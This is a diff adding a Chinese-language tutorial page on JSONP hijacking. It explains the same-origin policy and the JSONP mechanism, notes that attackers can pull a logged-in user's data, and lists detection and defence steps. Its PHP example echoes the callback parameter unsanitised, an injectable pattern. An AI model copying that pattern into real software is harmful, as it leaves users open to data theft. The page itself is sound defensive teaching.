+<h3 id="h:b0255428-392d-4422-b5da-88bd7d24e836"><a href="#h:b0255428-392d-4422-b5da-88bd7d24e836">jsonp劫持</a></h3>
+<div class="outline-text-3" id="text-h:b0255428-392d-4422-b5da-88bd7d24e836">
+<p>
+<b>JSONP原理</b>
+</p>
+
+<p>
+JavaScript是一种在Web开发中经常使用的前端动态脚本技术。在JavaScript中，有一个很重要的安全性限制，被称为“Same-Origin Policy”（同源策略）。这一策略对于JavaScript代码能够访问的页面内容做了很重要的限制，即JavaScript只能访问与包含它的文档在同一域下的内容。
+</p>
+
+<p>
+利用在页面中创建 &lt;script&gt; 节点的方法向不同域提交HTTP请求的方法称为JSONP，这项技术可以解决跨域提交Ajax请求的问题。
+</p>
+
+<p>
+JSONP的最基本的原理是：动态添加一个 &lt;script&gt; 标签，而script标签的src属性是没有跨域的限制的。
+</p>
+
+<p>
+简单的例子：
+</p>
+<div class="org-src-container">
+<pre class="src src-html">&lt;<span class="org-keyword">!DOCTYPE</span> html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
+"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"&gt; 
+&lt;<span class="org-function-name">html</span> <span class="org-variable-name">xmlns</span>=<span class="org-string">"http://www.w3.org/1999/xhtml"</span> &gt; 
+&lt;<span class="org-function-name">head</span>&gt; 
+&lt;<span class="org-function-name">title</span>&gt;<span class="org-underline"><span class="org-bold">Test Jsonp</span></span>&lt;/<span class="org-function-name">title</span>&gt;
+ &lt;<span class="org-function-name">script</span> <span class="org-variable-name">type</span>=<span class="org-string">"text/javascript"</span>&gt; 
+ function jsonpCallback(result)
+{ 
+ alert(result.msg); 
+} 
+ &lt;/<span class="org-function-name">script</span>&gt;
+ &lt;<span class="org-function-name">script</span> <span class="org-variable-name">type</span>=<span class="org-string">"text/javascript"</span>src=<span class="org-string">"http://xxx.com/jsonServerResponse?
+jsonp=jsonpCallback"</span>&gt;&lt;/<span class="org-function-name">script</span>&gt; 
+&lt;/<span class="org-function-name">head</span>&gt; 
+&lt;<span class="org-function-name">body</span>&gt;
+&lt;/<span class="org-function-name">body</span>&gt;
+&lt;/<span class="org-function-name">html</span>&gt; 
+</pre>
+</div>
+
+<p>
+其中 jsonCallback 是客户端注册的，获取跨域服务器上的json数据后，回调的函数。
+</p>
+
+<p>
+可以使用PHP模拟后端服务器，返回json内容
+</p>
+
+<div class="org-src-container">
+<pre class="src src-php">&lt;?php
+$call_method = $_GET['jsonp'];
+echo $call_method . "({msg: 'this is json data'})";
+</pre>
+</div>
+
+<p>
+<a href="http://xxx.com/jsonServerResponse?jsonp=jsonpCallback">http://xxx.com/jsonServerResponse?jsonp=jsonpCallback</a> 这个 url 是跨域服务器取 json 数据的接口，参数为回调函数的名字，返回的格式为： jsonpCallback({msg:'this is json data'})
+</p>
+
+<p>
+简述原理与过程：
+</p>
+<ul class="org-ul">
+<li>首先在客户端注册一个callback, 然后把callback的名字传给服务器。此时，服务器先生成 json数据。</li>
+<li>然后以 javascript 语法的方式，生成一个function , function 名字就是传递上来的参数 jsonp。</li>
+<li>最后将json 数据直接以入参的方式，放置到 function 中，这样就生成了一段 js 语法的文档，返回给客户端。</li>
+</ul>
+
+<p>
+客户端浏览器，解析script标签，并执行返回的 javascript 文档，此时数据作为参数，传入到了客户端预先定义好的 callback 函数里。（动态执行回调函数）
+</p>
+
+<p>
+浏览器在登录状态下，攻击者可通过jsonp拿到用户的登录信息并发送给攻击者。
+</p>
+
+<p>
+漏洞发现与修复：
+检查：
+</p>
+<ul class="org-ul">
+<li>人工参透，发现代码中有jsonp或callback字符的多留意一下。</li>
+<li>查看返回值，是否带函数调用。如jsonpCallback(msg)</li>
+</ul>
+
+<p>
+防御：
+</p>
+<ul class="org-ul">
+<li>是否是敏感数据。如果不是，无所谓。如果是，要去掉jsonp方式调用，开启同源策略，让后端处理对应逻辑。
+<ul class="org-ul">
+<li>不用jsonp，又要跨域拿数据，怎么拿？ 直接从后端拿数据。</li>
+</ul></li>
+<li>自动化发现漏洞。写自动化代码扫描工具，检查有callback特征的、对应script src请求标签中是否有和页面定义函数名相同的特征</li>
+</ul>
+</div>
+</div>
+</section>
+</div>
+<div id="postamble" class="status">
+<!-- 这里曾经放过一个手动 AdSense 广告位（<ins> + push）。
+     问题：AdSense 要约 6 秒才把 data-ad-status 置为 unfilled，
+     在那之前填不出广告的空位会显示成一块黄色方块，体验很差。
+     现改为使用 Google 自动广告 —— 由 Google 决定何时何地插入，
+     没有广告时就不会创建空位。加载器已在 <head> 里，无需额外代码，
+     开关在 AdSense 后台的「自动广告」。 -->
+<script type="text/javascript" src="/static/aandds.com/js/postamble.js"></script>
+</div>
+</body>
+</html>
